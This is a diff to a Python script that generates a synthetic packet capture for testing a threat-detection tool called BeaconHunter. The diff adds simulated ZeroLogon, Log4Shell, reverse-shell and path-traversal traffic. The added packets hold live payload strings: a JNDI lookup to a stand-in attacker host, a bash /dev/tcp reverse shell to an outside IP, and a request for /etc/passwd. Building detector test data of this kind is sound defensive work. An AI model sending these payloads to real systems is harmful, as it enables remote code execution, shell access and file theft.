@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 """
 Synthetic PCAP Generator for BeaconHunter Testing.
-Creates a realistic traffic capture containing:
+Creates a realistic multi-threat traffic capture containing:
 1. Normal user web browsing (randomized intervals, non-periodic).
 2. Realistic C2 Beaconing (periodic intervals with ~10% jitter).
 3. High-entropy DNS Tunneling / Data exfiltration.
-4. Simulated ZeroLogon (CVE-2020-1472) attack against a Domain Controller (MS-NRPC).
+4. Simulated ZeroLogon (CVE-2020-1472 / EDB-49301) attack against a Domain Controller (MS-NRPC).
+5. Simulated Log4Shell (CVE-2021-44228 / EDB-50592) JNDI RCE attempt over HTTP.
+6. Simulated Unix Reverse Shell command injection payload.
+7. Simulated Path Traversal / LFI attempt (../../../../etc/passwd).
 """
 
 import os
@@ -20,21 +23,18 @@ NETLOGON_UUID_LE = b"\x78\x56\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\xc
 
 
 def create_dcerpc_request(opnum: int, payload_data: bytes) -> bytes:
-    """Constructs a basic DCERPC Request PDU (Type 0x00)."""
     frag_len = 24 + len(payload_data)
-    # Header: Version 5.0, PacketType 0 (Request), Flags 3 (First|Last), Little-Endian DataRep
     header = b"\x05\x00\x00\x03\x10\x00\x00\x00"
-    header += struct.pack("<H", frag_len)  # Frag length
-    header += b"\x00\x00"                  # Auth length
-    header += b"\x01\x00\x00\x00"          # Call ID 1
-    header += struct.pack("<I", len(payload_data))  # Alloc hint
-    header += b"\x00\x00"                  # Context ID 0
-    header += struct.pack("<H", opnum)     # Opnum (2 bytes)
+    header += struct.pack("<H", frag_len)
+    header += b"\x00\x00"
+    header += b"\x01\x00\x00\x00"
+    header += struct.pack("<I", len(payload_data))
+    header += b"\x00\x00"
+    header += struct.pack("<H", opnum)
     return header + payload_data
 
 
 def create_dcerpc_response(status_code: int = 0x00000000) -> bytes:
-    """Constructs a basic DCERPC Response PDU (Type 0x02)."""
     payload_data = struct.pack("<I", status_code)
     frag_len = 24 + len(payload_data)
     header = b"\x05\x00\x02\x03\x10\x00\x00\x00"
@@ -43,7 +43,7 @@ def create_dcerpc_response(status_code: int = 0x00000000) -> bytes:
     header += b"\x01\x00\x00\x00"
     header += struct.pack("<I", len(payload_data))
     header += b"\x00\x00"
-    header += b"\x00\x00"                  # Cancel count / reserved
+    header += b"\x00\x00"
     return header + payload_data
 
 
@@ -54,7 +54,7 @@ def generate_synthetic_pcap(output_path: str = "samples/c2_traffic_sample.pcap")
     base_time = 1700000000.0
     client_ip = "192.168.1.105"
 
-    print("[*] Generating synthetic benign and malicious traffic...")
+    print("[*] Generating comprehensive multi-threat network capture...")
 
     # -------------------------------------------------------------
     # 1. Normal Web Traffic (Bursty, non-periodic)
@@ -87,7 +87,7 @@ def generate_synthetic_pcap(output_path: str = "samples/c2_traffic_sample.pcap")
     jitter_range = 3.0
     cur_time = base_time + 10.0
 
-    print("[*] Injecting simulated C2 beaconing (30s interval, 10% jitter, 10 pulses)...")
+    print("[*] Injecting simulated C2 beaconing (30s interval, 10% jitter)...")
 
     for _ in range(10):
         interval = beacon_interval + random.uniform(-jitter_range, jitter_range)
@@ -134,52 +134,78 @@ def generate_synthetic_pcap(output_path: str = "samples/c2_traffic_sample.pcap")
         packets.append(exfil_pkt)
 
     # -------------------------------------------------------------
-    # 4. ZeroLogon (CVE-2020-1472) Attack Simulation
-    # Attacker: 192.168.1.55 -> Target DC: 192.168.1.10:445
+    # 4. ZeroLogon (CVE-2020-1472 / EDB-49301) Attack Simulation
     # -------------------------------------------------------------
     attacker_ip = "192.168.1.55"
     dc_ip = "192.168.1.10"
     dc_port = 445
     zl_time = base_time + 45.0
 
-    print("[*] Injecting simulated CVE-2020-1472 ZeroLogon exploit stream...")
+    print("[*] Injecting CVE-2020-1472 ZeroLogon exploit stream...")
 
-    # A) Bind to Netlogon
     bind_pdu = b"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00" + NETLOGON_UUID_LE + b"\x01\x00\x00\x00"
     p_bind = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / bind_pdu
     p_bind.time = zl_time
     packets.append(p_bind)
     zl_time += 0.05
 
-    # B) NetrServerReqChallenge (Opnum 4) with 8 zero bytes client challenge
     req_challenge = create_dcerpc_request(4, b"\\DC01\x00\x00" + (b"\x00" * 8))
     p_req = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / req_challenge
     p_req.time = zl_time
     packets.append(p_req)
     zl_time += 0.05
 
-    # C) Brute-force NetrServerAuthenticate3 (Opnum 26) with 8 zero bytes
-    for attempt in range(60):
+    for attempt in range(40):
         zl_time += 0.01
         auth_pdu = create_dcerpc_request(26, b"\x00" * 32)
         p_auth = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / auth_pdu
         p_auth.time = zl_time
         packets.append(p_auth)
 
-        # On attempt 50, simulate STATUS_SUCCESS bypass
-        if attempt == 50:
+        if attempt == 30:
             zl_time += 0.005
-            resp_pdu = create_dcerpc_response(0x00000000)  # STATUS_SUCCESS
+            resp_pdu = create_dcerpc_response(0x00000000)
             p_resp = IP(src=dc_ip, dst=attacker_ip) / TCP(sport=dc_port, dport=51234, flags="PA") / resp_pdu
             p_resp.time = zl_time
             packets.append(p_resp)
 
-    # D) NetrServerPasswordSet2 (Opnum 30) - Exploit payload that resets machine password!
     zl_time += 0.05
     pw_reset_pdu = create_dcerpc_request(30, b"\x00" * 64)
     p_pw = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / pw_reset_pdu
     p_pw.time = zl_time
     packets.append(p_pw)
+
+    # -------------------------------------------------------------
+    # 5. Log4Shell (CVE-2021-44228 / EDB-50592) JNDI Injection
+    # -------------------------------------------------------------
+    print("[*] Injecting Log4Shell (CVE-2021-44228) JNDI RCE packet...")
+    web_server = "192.168.1.80"
+    log4j_time = base_time + 120.0
+    log4j_payload = (
+        b"GET /login HTTP/1.1\r\n"
+        b"Host: 192.168.1.80:8080\r\n"
+        b"User-Agent: ${jndi:ldap://attacker-c2.net:1389/Exploit}\r\n"
+        b"Accept: text/html\r\n\r\n"
+    )
+    p_log4j = IP(src=attacker_ip, dst=web_server) / TCP(sport=43210, dport=8080, flags="PA") / log4j_payload
+    p_log4j.time = log4j_time
+    packets.append(p_log4j)
+
+    # -------------------------------------------------------------
+    # 6. Unix Reverse Shell & Path Traversal Injection
+    # -------------------------------------------------------------
+    print("[*] Injecting Unix Reverse Shell and Path Traversal packets...")
+    shell_time = base_time + 180.0
+    shell_payload = b"POST /api/cmd HTTP/1.1\r\nHost: 192.168.1.80\r\n\r\ncmd=/bin/bash -i >& /dev/tcp/198.51.100.44/4444 0>&1\r\n"
+    p_shell = IP(src=attacker_ip, dst=web_server) / TCP(sport=43212, dport=8080, flags="PA") / shell_payload
+    p_shell.time = shell_time
+    packets.append(p_shell)
+
+    trav_time = base_time + 210.0
+    trav_payload = b"GET /view?page=../../../../etc/passwd HTTP/1.1\r\nHost: 192.168.1.80\r\n\r\n"
+    p_trav = IP(src=attacker_ip, dst=web_server) / TCP(sport=43214, dport=8080, flags="PA") / trav_payload
+    p_trav.time = trav_time
+    packets.append(p_trav)
 
     # Sort all packets strictly by timestamp
     packets.sort(key=lambda p: float(p.time))
